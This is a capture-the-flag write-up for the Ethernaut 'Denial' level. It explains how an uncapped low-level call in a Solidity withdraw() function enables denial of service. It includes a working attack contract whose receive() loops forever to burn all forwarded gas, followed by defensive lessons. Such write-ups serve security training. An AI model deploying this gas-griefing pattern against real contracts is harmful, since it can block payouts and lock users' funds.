# Ethernaut #20 — Denial
**Pattern:** Denial of Service (DoS) via unbounded external call

## Vulnerability
`withdraw()` sends funds to `partner` via low-level `.call()` with no gas limit, forwarding all remaining gas. This happens **before** `owner.transfer()`, which only gets a fixed 2300 gas stipend. If the partner's `receive()` burns all forwarded gas, the tx never reaches enough leftover gas for the owner's transfer — the entire outer tx just runs out of gas.

## Exploit
```solidity
contract attack {
    Denial target;
    uint256 counter;
    constructor(Denial _target) { target = _target; }
    function attackContract() public {
        target.setWithdrawPartner(address(this));
        target.withdraw();
    }
    receive() external payable {
        while(true) { counter++; }
    }
}
```
Set attacker contract as `partner`. On `withdraw()`, the `.call()` to `partner` forwards all remaining gas into `receive()`, which spins forever — burning every last unit before returning. Owner's `.transfer()` never gets to execute with any gas left. Denial achieved in <1M gas since the loop just eats whatever's forwarded, no recursion/call-stack overhead.

## Lesson
- Low-level `.call()` with no explicit gas limit forwards **all** remaining gas — always cap it (`call{gas: X}`) when calling untrusted addresses mid-function.
- Never let external calls to untrusted/attacker-controlled addresses happen before critical state changes or payouts (checks-effects-interactions).
- Recursion-based DoS (via `receive()` re-entering `withdraw()`) hits the 1024 call-stack-depth limit and costs way more gas than a simple infinite loop — the loop is both cheaper and doesn't rely on recursion at all.
